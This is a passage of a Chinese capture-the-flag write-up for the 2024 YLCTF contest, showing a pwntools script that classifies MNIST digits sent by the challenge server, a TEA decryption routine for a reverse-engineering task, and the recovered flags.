<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">import</span> torch.nn <span class="hljs-keyword">as</span> nn<br><span class="hljs-keyword">from</span> torchvision <span class="hljs-keyword">import</span> transforms<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MNISTCNN</span>(nn.Module):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">super</span>(MNISTCNN, <span class="hljs-variable language_">self</span>).__init__()<br>        <span class="hljs-variable language_">self</span>.conv1 = nn.Conv2d(<span class="hljs-number">1</span>, <span class="hljs-number">32</span>, kernel_size=<span class="hljs-number">5</span>, padding=<span class="hljs-number">2</span>)<br>        <span class="hljs-variable language_">self</span>.pool = nn.MaxPool2d(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>)<br>        <span class="hljs-variable language_">self</span>.conv2 = nn.Conv2d(<span class="hljs-number">32</span>, <span class="hljs-number">64</span>, kernel_size=<span class="hljs-number">5</span>)<br>        <span class="hljs-variable language_">self</span>.fc1 = nn.Linear(<span class="hljs-number">64</span> * <span class="hljs-number">5</span> * <span class="hljs-number">5</span>, <span class="hljs-number">1024</span>)<br>        <span class="hljs-variable language_">self</span>.fc2 = nn.Linear(<span class="hljs-number">1024</span>, <span class="hljs-number">10</span>)<br>        <span class="hljs-variable language_">self</span>.relu = nn.ReLU()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, x</span>):<br>        x = <span class="hljs-variable language_">self</span>.pool(<span class="hljs-variable language_">self</span>.relu(<span class="hljs-variable language_">self</span>.conv1(x)))<br>        x = <span class="hljs-variable language_">self</span>.pool(<span class="hljs-variable language_">self</span>.relu(<span class="hljs-variable language_">self</span>.conv2(x)))<br>        x = x.view(-<span class="hljs-number">1</span>, <span class="hljs-number">64</span> * <span class="hljs-number">5</span> * <span class="hljs-number">5</span>)  <span class="hljs-comment"># 展平</span><br>        x = <span class="hljs-variable language_">self</span>.relu(<span class="hljs-variable language_">self</span>.fc1(x))<br>        x = <span class="hljs-variable language_">self</span>.fc2(x)<br>        <span class="hljs-keyword">return</span> x<br><br><br>p = remote(<span class="hljs-string">&quot;challenge.yuanloo.com&quot;</span>, <span class="hljs-number">32061</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">36</span>):<br>    a = p.recvuntil(<span class="hljs-string">b&quot;input num %s \n&quot;</span> % <span class="hljs-built_in">str</span>(i + <span class="hljs-number">1</span>).encode(), timeout=<span class="hljs-number">3</span>)<br><br>    <span class="hljs-comment"># 加载模型权重</span><br>    model = MNISTCNN()<br>    model.load_state_dict(torch.load(<span class="hljs-string">&#x27;model.pth&#x27;</span>, map_location=torch.device(<span class="hljs-string">&#x27;cpu&#x27;</span>)))<br>    model.<span class="hljs-built_in">eval</span>()<br><br>    <span class="hljs-comment"># 定义变换</span><br>    transform = transforms.Compose([<br>        transforms.Resize((<span class="hljs-number">28</span>, <span class="hljs-number">28</span>)),<br>        transforms.ToTensor(),<br>        transforms.Normalize((<span class="hljs-number">0.1307</span>,), (<span class="hljs-number">0.3081</span>,))<br>    ])<br><br>    f = re.findall(<span class="hljs-string">r&quot;[01]+&quot;</span>, a.decode())[<span class="hljs-number">0</span>]<br>    <span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;i&#125;</span>.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>).write(f)<br>    binary_data = f.strip()<br>    image_array = np.array([<span class="hljs-built_in">int</span>(pixel) <span class="hljs-keyword">for</span> pixel <span class="hljs-keyword">in</span> binary_data])<br>    image_array = image_array.reshape(<span class="hljs-number">480</span>, <span class="hljs-number">640</span>)<br><br>    image = Image.fromarray(np.uint8(image_array * <span class="hljs-number">255</span>), mode=<span class="hljs-string">&#x27;L&#x27;</span>)<br>    image = transform(image).unsqueeze(<span class="hljs-number">0</span>)<br><br>    <span class="hljs-keyword">with</span> torch.no_grad():<br>        output = model(image)<br>        _, predicted = torch.<span class="hljs-built_in">max</span>(output, <span class="hljs-number">1</span>)<br><br>    b = p.sendline(<span class="hljs-string">b&quot;%s&quot;</span> % <span class="hljs-built_in">str</span>(predicted.item()).encode())<br>    <span class="hljs-built_in">print</span>(a[-<span class="hljs-number">14</span>:], <span class="hljs-string">b&quot;%s&quot;</span> % <span class="hljs-built_in">str</span>(predicted.item()).encode())<br><br>data = p.recvall(timeout=<span class="hljs-number">5</span>)<br><span class="hljs-built_in">print</span>(data)<br></code></pre></td></tr></table></figure>

<p><img src="../../../../img/archives/2024-YLCTF/image-20241018174518600.png" srcset="/img/loading.gif" lazyload alt="image-20241018174518600"></p>
<p>YLCTF{3c85be81-36a1-4aaa-bf93-83ec6faae780}</p>
<h4 id="Reverse-1"><a href="#Reverse-1" class="headerlink" title="Reverse"></a>Reverse</h4><h5 id="Round-2-ezwasm"><a href="#Round-2-ezwasm" class="headerlink" title="[Round 2] ezwasm"></a>[Round 2] ezwasm</h5><p>建议放Cry&#x2F;Misc，CyberCHef直接嗦了</p>
<p><img src="../../../../img/archives/2024-YLCTF/image-20241018221201707.png" srcset="/img/loading.gif" lazyload alt="image-20241018221201707"></p>
<h5 id="Round-2-三点几啦饮茶先"><a href="#Round-2-三点几啦饮茶先" class="headerlink" title="[Round 2] 三点几啦饮茶先"></a>[Round 2] 三点几啦饮茶先</h5><p>ez，直接网上找个解密脚本让AI微调</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">tea_dec</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span>* v, <span class="hljs-type">uint32_t</span>* k)</span> </span>&#123;<br>    <span class="hljs-type">uint32_t</span> v0 = v[<span class="hljs-number">0</span>], v1 = v[<span class="hljs-number">1</span>];  <span class="hljs-comment">// v0、v1分别是密文的左、右半部分</span><br>    <span class="hljs-type">uint32_t</span> delta = <span class="hljs-number">289739961</span>;     <span class="hljs-comment">// 根据之前的加密逻辑，delta值为289739961</span><br>    <span class="hljs-type">uint32_t</span> sum = <span class="hljs-number">40</span> * delta;      <span class="hljs-comment">// 加密轮数为40轮，因此解密时sum是40倍的delta</span><br>    <span class="hljs-type">int</span> i;                          <span class="hljs-comment">// 在循环外部声明变量i</span><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">40</span>; i++) &#123;      <span class="hljs-comment">// tea加密进行40轮</span><br>        <span class="hljs-comment">// 根据加密时的顺序颠倒下面3行的顺序，将加法改为减法（异或部分都是整体，不用管），就是逆向解密过程</span><br>        v1 -= (((v0 &gt;&gt; <span class="hljs-number">5</span>) ^ (<span class="hljs-number">16</span> * v0)) + v0) ^ (k[(sum &gt;&gt; <span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>] + sum);<br>        sum -= delta;<br>        v0 -= (((v1 &gt;&gt; <span class="hljs-number">3</span>) ^ (<span class="hljs-number">4</span> * v1)) + v1) ^ (k[sum &amp; <span class="hljs-number">3</span>] + sum);<br>    &#125;<br>    <span class="hljs-comment">// 解密后的内容要还给v数组</span><br>    v[<span class="hljs-number">0</span>] = v0;<br>    v[<span class="hljs-number">1</span>] = v1;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-comment">// k为加解密密钥，4个32位无符号整数，密钥长度为128位</span><br>    <span class="hljs-type">uint32_t</span> k[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">4097</span>, <span class="hljs-number">8194</span>, <span class="hljs-number">12291</span>, <span class="hljs-number">16388</span>&#125;;  <span class="hljs-comment">// 根据之前的加密逻辑，密钥为v9数组的值</span><br>    <span class="hljs-comment">// v为要加解密的数据，两个32位无符号整数</span><br>    <span class="hljs-comment">// 否则会报类型转换的错误，但是单独给每个元素赋值就可以，不清楚原因，但是也算学到一招，避免以后遇到这种问题没法解决</span><br>    <span class="hljs-type">uint32_t</span> v[<span class="hljs-number">2</span>] = &#123;<span class="hljs-number">1913208188</span>, <span class="hljs-number">-1240730499</span>&#125;;  <span class="hljs-comment">// 根据之前的加密结果，密文为1913208188和-1240730499</span><br><br>    <span class="hljs-comment">// 解密</span><br>    <span class="hljs-built_in">tea_dec</span>(v, k);<br><br>    <span class="hljs-comment">// 打印解密后的结果</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%u\n%u\n&quot;</span>, v[<span class="hljs-number">0</span>], v[<span class="hljs-number">1</span>]);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>926048868<br>1667512119</p>
<p>success give you flag YLCTF{0fb86ed4-318a-4567-b83c-c01d5529eaea}</p>
<h3 id="Round-3"><a href="#Round-3" class="headerlink" title="Round 3"></a>Round 3</h3><h4 id="Misc-2"><a href="#Misc-2" class="headerlink" title="Misc"></a>Misc</h4><h5 id="Round-3-Blackdoor"><a href="#Round-3-Blackdoor" class="headerlink" title="[Round 3] Blackdoor"></a>[Round 3] Blackdoor</h5><p>D盾一把嗦</p>
<p><img src="../../../../img/archives/2024-YLCTF/image-20241023161635764.png" srcset="/img/loading.gif" lazyload alt="image-20241023161635764"></p>
<p><img src="../../../../img/archives/2024-YLCTF/image-20241023161648260.png" srcset="/img/loading.gif" lazyload alt="image-20241023161648260"></p>
<p>YLCTF{e2bae51b981c707eb28302fe22d60340}</p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="../../../../tags/CTF/" class="print-no-link">#CTF</a>
      
        <a href="../../../../tags/Misc/" class="print-no-link">#Misc</a>
      
        <a href="../../../../tags/Web/" class="print-no-link">#Web</a>
      
        <a href="../../../../tags/Crypto/" class="print-no-link">#Crypto</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>2024 YLCTF</div>
      <div>http://example.com/2024/11/01/2024-YLCTF/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>tenstrings</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2024年11月1日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-cc-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="../2024-NewStarCTF/" title="2024 NewStarCTF">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">2024 NewStarCTF</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="../../../10/16/2024%E9%A2%86%E8%88%AA%E6%9D%AF%E6%9C%AC%E7%A7%91%E7%BB%84%E5%88%9D%E8%B5%9B/" title="2024领航杯本科组初赛">
                        <span class="hidden-mobile">2024领航杯本科组初赛</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="leancloud-site-pv-container" style="display: none">
        总访问量 
        <span id="leancloud-site-pv"></span>
         次
      </span>
    
    
      <span id="leancloud-site-uv-container" style="display: none">
        总访客数 
        <span id="leancloud-site-uv"></span>
         人
      </span>
    
    

  

</div>

  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="../../../../js/events.js" ></script>
<script  src="../../../../js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="../../../../js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script defer src="../../../../js/leancloud.js" ></script>

  <script  src="../../../../js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="../../../../js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
